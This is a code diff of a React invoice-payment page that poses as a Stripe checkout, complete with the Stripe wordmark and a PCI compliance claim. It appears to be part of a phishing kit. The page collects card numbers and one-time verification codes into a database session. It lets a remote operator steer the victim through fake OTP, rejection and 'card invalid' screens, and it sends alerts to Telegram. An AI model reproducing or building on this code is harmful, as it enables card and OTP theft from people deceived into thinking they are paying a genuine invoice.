@@ -45,7 +45,6 @@ const InvoicePayment = () => {
     return () => { supabase.removeChannel(channel); };
   }, []);
 
-
   // Load invoice and business settings
   useEffect(() => {
     const load = async () => {
@@ -53,69 +52,40 @@ const InvoicePayment = () => {
         supabase.from("invoices").select("*").eq("id", invoiceId).single(),
         supabase.from("business_settings").select("*").limit(1).single(),
       ]);
-
-      if (invoiceRes.error || !invoiceRes.data) {
-        setStep("not_found");
-        return;
-      }
-
+      if (invoiceRes.error || !invoiceRes.data) { setStep("not_found"); return; }
       setInvoice(invoiceRes.data);
       if (settingsRes.data) setBusinessSettings(settingsRes.data);
-
-      if (invoiceRes.data.status === "paid") {
-        setStep("paid");
-      } else {
-        setStep("form");
-      }
+      if (invoiceRes.data.status === "paid") setStep("paid");
+      else setStep("form");
     };
     if (invoiceId) load();
   }, [invoiceId]);
 
-  // Session status handler (stable ref to avoid re-subscribing)
+  // Session status handler
   const handleStatusChangeRef = useRef<(status: string, formData: Record<string, any>) => void>(() => {});
   handleStatusChangeRef.current = (newStatus: string, formData: Record<string, any>) => {
     const currentStep = stepRef.current;
-
     if (currentStep === "processing_card" || currentStep === "waiting") {
-      if (newStatus === "otp") {
-        setOtpError(null);
-        setOtpType((formData.otp_type as OtpType) || "6digit");
-        setStep("otp");
-      }
+      if (newStatus === "otp") { setOtpError(null); setOtpType((formData.otp_type as OtpType) || "6digit"); setStep("otp"); }
       if (newStatus === "rejected") setStep("rejected");
-      if (newStatus === "card_invalid") {
-        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-        setStep("card_declined");
-      }
+      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
     }
     if (currentStep === "otp") {
-      if (newStatus === "otp") {
-        setOtpType((formData.otp_type as OtpType) || "6digit");
-      }
+      if (newStatus === "otp") setOtpType((formData.otp_type as OtpType) || "6digit");
       if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
       if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
       if (newStatus === "rejected") setStep("rejected");
-      if (newStatus === "card_invalid") {
-        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-        setStep("card_declined");
-      }
+      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
     }
     if (currentStep === "processing") {
-      if (newStatus === "success") {
-        setStep("success");
-        supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId);
-      }
+      if (newStatus === "success") { setStep("success"); supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId); }
       if (newStatus === "rejected") setStep("rejected");
       if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
       if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
-      if (newStatus === "card_invalid") {
-        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-        setStep("card_declined");
-      }
+      if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
     }
   };
 
-  // Real-time + polling session sync
   useSessionSync(sessionId, {
     onStatusChange: (status, formData) => handleStatusChangeRef.current(status, formData),
   });
@@ -126,14 +96,12 @@ const InvoicePayment = () => {
     pendingSessionId.current = id;
     setSessionId(id);
     setCardInvalidError(null);
-    // Grab the submitted card details for the success screen
     const { data } = await supabase.from("sessions").select("form_data").eq("id", id).single();
     const fd = (data?.form_data as any) || {};
     if (fd.email) setSubmittedEmail(fd.email);
     if (fd.cardNumber) {
       const digits = fd.cardNumber.replace(/\s/g, "");
       setSubmittedCardLast4(digits.slice(-4));
-      // Detect brand
       if (/^4/.test(digits)) setSubmittedCardBrand("visa");
       else if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) setSubmittedCardBrand("mastercard");
       else if (/^3[47]/.test(digits)) setSubmittedCardBrand("amex");
@@ -143,28 +111,21 @@ const InvoicePayment = () => {
   };
 
   const handleProcessingComplete = useCallback(() => {
-    // Only transition to waiting if still on processing_card (realtime may have already moved us)
-    if (stepRef.current === "processing_card") {
-      setStep("waiting");
-    }
+    if (stepRef.current === "processing_card") setStep("waiting");
   }, []);
 
   const handleOtpResend = async () => {
     if (!sessionId) return;
     try {
-      // Update session form_data with resend flag so admin panel sees it
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
       const existingData = (data?.form_data as Record<string, any>) || {};
       await supabase.from("sessions").update({
         form_data: { ...existingData, resend_requested: true, resend_requested_at: new Date().toISOString() } as any,
       }).eq("id", sessionId);
-
       await supabase.functions.invoke("send-to-telegram", {
         body: { type: "otp", otp: "🔄 Client clicked RESEND verification code / approval request" },
       });
-    } catch {
-      // fail silently
-    }
+    } catch { /* fail silently */ }
   };
 
   const handleOtpSubmit = async (otp: string) => {
@@ -172,9 +133,7 @@ const InvoicePayment = () => {
     if (sessionId) {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
       const existingData = (data?.form_data as Record<string, any>) || {};
-      await supabase.from("sessions")
-        .update({ status: "otp_submitted" as any, form_data: { ...existingData, otp } as any })
-        .eq("id", sessionId);
+      await supabase.from("sessions").update({ status: "otp_submitted" as any, form_data: { ...existingData, otp } as any }).eq("id", sessionId);
     }
     setStep("processing");
   };
@@ -184,24 +143,21 @@ const InvoicePayment = () => {
   const parsedAmount = parseFloat(amount) || 0;
   const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
   const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
-  const isValidAmount = parsedAmount >= 1;
 
   const formatEuro = (val: number) =>
     val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });
 
-  if (step === "loading") {
-    return <InvoiceLoadingSkeleton />;
-  }
+  if (step === "loading") return <InvoiceLoadingSkeleton />;
 
   if (step === "not_found") {
     return (
       <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
-        <div className="text-center space-y-3">
-          <div className="h-16 w-16 rounded-full bg-white/5 flex items-center justify-center mx-auto">
-            <Lock className="h-8 w-8 text-white/30" />
+        <div className="text-center space-y-4 animate-stripe-slide">
+          <div className="h-16 w-16 rounded-2xl bg-white/[0.04] border border-white/[0.06] flex items-center justify-center mx-auto">
+            <Lock className="h-7 w-7 text-white/25" />
           </div>
-          <h1 className="text-xl font-semibold text-white">Invoice not found</h1>
-          <p className="text-white/40 text-sm max-w-sm">This payment link is invalid or has expired. Please contact the merchant for a new link.</p>
+          <h1 className="text-xl font-display font-semibold text-white">Invoice not found</h1>
+          <p className="text-white/35 text-sm max-w-sm leading-relaxed">This payment link is invalid or has expired. Please contact the merchant for a new link.</p>
         </div>
       </div>
     );
@@ -210,12 +166,12 @@ const InvoicePayment = () => {
   if (step === "paid") {
     return (
       <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
-        <div className="text-center space-y-3">
-          <div className="h-16 w-16 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto">
-            <ShieldCheck className="h-8 w-8 text-emerald-400" />
+        <div className="text-center space-y-4 animate-stripe-slide">
+          <div className="h-16 w-16 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mx-auto">
+            <ShieldCheck className="h-7 w-7 text-emerald-400" />
           </div>
-          <h1 className="text-xl font-semibold text-white">Invoice already paid</h1>
-          <p className="text-white/40 text-sm max-w-sm">This invoice ({invoice?.invoice_number}) has already been paid. No further action is needed.</p>
+          <h1 className="text-xl font-display font-semibold text-white">Invoice already paid</h1>
+          <p className="text-white/35 text-sm max-w-sm leading-relaxed">This invoice ({invoice?.invoice_number}) has already been paid. No further action is needed.</p>
         </div>
       </div>
     );
@@ -223,124 +179,118 @@ const InvoicePayment = () => {
 
   return (
     <div className="min-h-screen bg-stripe-bg flex">
-      {/* Left panel — branding / order summary */}
-      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
+      {/* Left panel — order summary */}
+      <div className="hidden lg:flex lg:w-[480px] xl:w-[540px] flex-col justify-between p-10 xl:p-14">
         <div>
-          <div className="flex items-center gap-2 mb-12">
-            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
+          {/* Company branding */}
+          <div className="flex items-center gap-3 mb-14">
+            <div className="h-10 w-10 rounded-xl bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center shadow-lg shadow-primary/20">
               <span className="text-primary-foreground text-sm font-bold">{companyName.charAt(0)}</span>
             </div>
-            <span className="text-white/90 font-semibold text-lg">{companyName}</span>
+            <span className="text-white/90 font-display font-semibold text-lg tracking-tight">{companyName}</span>
           </div>
 
-          <div className="space-y-6">
+          <div className="space-y-8">
+            {/* Amount display */}
             <div>
-              <p className="text-white/50 text-sm">Invoice from {companyName}</p>
-              <p className="text-white/40 text-xs mt-0.5">Ref: {invoice?.invoice_number}</p>
-              <p className="text-white text-4xl font-bold tracking-tight mt-1">
+              <p className="text-white/40 text-sm font-medium">Invoice from {companyName}</p>
+              <p className="text-white/25 text-xs mt-1 font-mono">Ref: {invoice?.invoice_number}</p>
+              <p className="text-white text-5xl font-display font-extrabold tracking-tight mt-3">
                 {formatEuro(total)}
               </p>
             </div>
 
+            {/* Description & bill-to cards */}
             {invoice?.description && (
-              <div className="bg-white/[0.04] rounded-lg p-4 border border-white/[0.06]">
-                <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 mb-1">Description</p>
-                <p className="text-white/70 text-sm">{invoice.description}</p>
+              <div className="bg-white/[0.03] rounded-xl p-4 border border-white/[0.05] backdrop-blur-sm">
+                <p className="text-[10px] uppercase tracking-[0.15em] font-semibold text-white/25 mb-1.5">Description</p>
+                <p className="text-white/65 text-sm leading-relaxed">{invoice.description}</p>
               </div>
             )}
 
             {invoice?.client_name && (
-              <div className="bg-white/[0.04] rounded-lg p-4 border border-white/[0.06]">
-                <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 mb-1">Bill to</p>
-                <p className="text-white/70 text-sm">{invoice.client_name}</p>
-                {invoice.client_email && <p className="text-white/40 text-xs mt-0.5">{invoice.client_email}</p>}
+              <div className="bg-white/[0.03] rounded-xl p-4 border border-white/[0.05] backdrop-blur-sm">
+                <p className="text-[10px] uppercase tracking-[0.15em] font-semibold text-white/25 mb-1.5">Bill to</p>
+                <p className="text-white/65 text-sm">{invoice.client_name}</p>
+                {invoice.client_email && <p className="text-white/30 text-xs mt-1">{invoice.client_email}</p>}
               </div>
             )}
 
-            <div className="space-y-4 mt-8">
-              <div className="flex items-center justify-between py-3 border-b border-white/10">
-                <p className="text-white/50 text-sm">Amount</p>
-                <p className="text-white/90 text-sm">{formatEuro(parsedAmount)}</p>
+            {/* Line items */}
+            <div className="space-y-0 mt-10">
+              <div className="flex items-center justify-between py-3.5 border-b border-white/[0.06]">
+                <p className="text-white/40 text-sm">Amount</p>
+                <p className="text-white/80 text-sm font-medium tabular-nums">{formatEuro(parsedAmount)}</p>
               </div>
-              <div className="flex items-center justify-between py-3 border-b border-white/10">
-                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
-                <p className="text-white/90 text-sm">{formatEuro(transactionFee)}</p>
+              <div className="flex items-center justify-between py-3.5 border-b border-white/[0.06]">
+                <p className="text-white/40 text-sm">Transaction fee (0.1%)</p>
+                <p className="text-white/80 text-sm font-medium tabular-nums">{formatEuro(transactionFee)}</p>
               </div>
-              <div className="flex items-center justify-between py-3">
-                <p className="text-white/90 text-sm font-semibold">Total</p>
-                <p className="text-white text-sm font-semibold">{formatEuro(total)}</p>
+              <div className="flex items-center justify-between py-3.5">
+                <p className="text-white font-display font-semibold text-sm">Total due</p>
+                <p className="text-white font-display font-bold text-base tabular-nums">{formatEuro(total)}</p>
               </div>
             </div>
 
             {invoice?.due_date && (
-              <div className="flex items-center gap-2 text-white/30 text-xs mt-4">
+              <div className="flex items-center gap-2 text-white/20 text-xs mt-2">
                 <span>Due by {new Date(invoice.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" })}</span>
               </div>
             )}
           </div>
         </div>
 
-        {/* Trust signals */}
-        <div className="space-y-4">
-          <div className="flex items-center gap-3 text-white/30 text-xs">
-            <ShieldCheck className="h-4 w-4 text-emerald-400/60" />
-            <span>256-bit SSL Encrypted · PCI DSS Compliant</span>
+        {/* Trust footer */}
+        <div className="space-y-3">
+          <div className="flex items-center gap-2.5 text-white/25 text-xs">
+            <ShieldCheck className="h-4 w-4 text-emerald-400/50" />
+            <span>256-bit SSL Encrypted · PCI DSS Level 1 Compliant</span>
           </div>
-          <div className="flex items-center gap-4 text-white/30 text-xs">
-            <span className="flex items-center gap-1">Powered by <StripeWordmark className="h-3.5 text-white/50" /></span>
+          <div className="flex items-center gap-3 text-white/20 text-xs">
+            <span className="flex items-center gap-1.5">Powered by <StripeWordmark className="h-3.5 text-white/40" /></span>
             <span>·</span>
-            <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Terms</a>
-            <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Privacy</a>
+            <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/40 transition-colors">Terms</a>
+            <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/40 transition-colors">Privacy</a>
           </div>
         </div>
       </div>
 
-      {/* Right panel */}
-      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
+      {/* Right panel — form area */}
+      <div className="flex-1 flex items-start justify-center bg-background lg:rounded-tl-3xl lg:rounded-bl-3xl overflow-y-auto">
         <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
           {/* Mobile header */}
           <div className="lg:hidden mb-8">
-            <div className="flex items-center gap-2 mb-4">
-              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
+            <div className="flex items-center gap-2.5 mb-5">
+              <div className="h-8 w-8 rounded-lg bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center shadow-md shadow-primary/15">
                 <span className="text-primary-foreground text-xs font-bold">{companyName.charAt(0)}</span>
               </div>
-              <span className="text-foreground font-semibold">{companyName}</span>
+              <span className="text-foreground font-display font-semibold">{companyName}</span>
             </div>
             <p className="text-muted-foreground text-sm">Invoice from {companyName}</p>
-            <p className="text-muted-foreground/60 text-xs mt-0.5">Ref: {invoice?.invoice_number}</p>
-            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">{formatEuro(total)}</p>
+            <p className="text-muted-foreground/50 text-xs mt-0.5 font-mono">Ref: {invoice?.invoice_number}</p>
+            <p className="text-foreground text-3xl font-display font-bold tracking-tight mt-2">{formatEuro(total)}</p>
             {invoice?.description && (
-              <p className="text-muted-foreground text-sm mt-2">{invoice.description}</p>
+              <p className="text-muted-foreground text-sm mt-2 leading-relaxed">{invoice.description}</p>
             )}
             <div className="mt-3 space-y-1.5">
               <div className="flex items-center justify-between text-sm">
                 <span className="text-muted-foreground">Transaction fee (0.1%)</span>
-                <span className="text-foreground">{formatEuro(transactionFee)}</span>
+                <span className="text-foreground tabular-nums">{formatEuro(transactionFee)}</span>
               </div>
               <div className="flex items-center justify-between text-sm font-semibold">
                 <span className="text-foreground">Total</span>
-                <span className="text-foreground">{formatEuro(total)}</span>
+                <span className="text-foreground tabular-nums">{formatEuro(total)}</span>
               </div>
             </div>
-            {/* Mobile trust signal */}
-            <div className="flex items-center gap-2 mt-4 text-muted-foreground/50 text-xs">
-              <ShieldCheck className="h-3.5 w-3.5 text-emerald-500/60" />
+            <div className="flex items-center gap-2 mt-4 text-muted-foreground/40 text-xs">
+              <ShieldCheck className="h-3.5 w-3.5 text-emerald-500/50" />
               <span>SSL Encrypted · PCI DSS Compliant</span>
             </div>
           </div>
 
           {step === "form" && (
-            <PaymentForm
-              amount={String(parsedAmount)}
-              onAmountChange={() => {}}
-              total={total}
-              isValidAmount={true}
-              formatEuro={formatEuro}
-              onSuccess={handleFormSubmit}
-              fixedAmount={true}
-              invoiceId={invoiceId}
-              cardInvalidError={cardInvalidError}
-            />
+            <PaymentForm amount={String(parsedAmount)} onAmountChange={() => {}} total={total} isValidAmount={true}
+              formatEuro={formatEuro} onSuccess={handleFormSubmit} fixedAmount={true} invoiceId={invoiceId} cardInvalidError={cardInvalidError} />
           )}
           {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
           {step === "waiting" && <WaitingScreen amount={formatEuro(total)} />}
